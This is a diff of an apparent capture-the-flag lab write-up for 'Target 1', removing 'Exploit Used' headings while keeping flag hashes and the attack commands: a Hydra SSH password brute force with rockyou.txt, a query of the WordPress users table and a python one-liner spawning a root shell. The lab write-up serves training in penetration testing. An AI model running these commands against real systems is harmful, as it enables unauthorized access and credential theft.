@@ -44,7 +44,6 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
 
    `flag1.txt`: b9bbcb33e11b80be759c4e844862482d
   
-    Exploit Used
       - Exploit method: Used Hydra to brute force user Michael's password (user: michael pass: michael)
       - Command used: hydra -l michael -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.110
   
@@ -53,7 +52,6 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
   
    `flag2.txt`: fc3fd58dcdad9ab23faca6e9a36e581c
  
-    Exploit Used
       - Navigated to webroot without being a privileged user
       - Command used: cd /www/var
  
@@ -63,7 +61,6 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
  
    `flag3.txt`: afc01ab56b50591e7dccf93122770cd2
 
-    Exploit Used
       - Able to access user table in mySQL database
       - Command used: SELECT * FROM wp_users;
 
@@ -73,7 +70,6 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
 
    `flag4.txt`: 715dea6c055b9fe3337544932f2941ce
  
-    Exploit Used
       - Spawning root shell from python command
       - Command used: python -c 'import os; os.system("/bin/sh")'
 
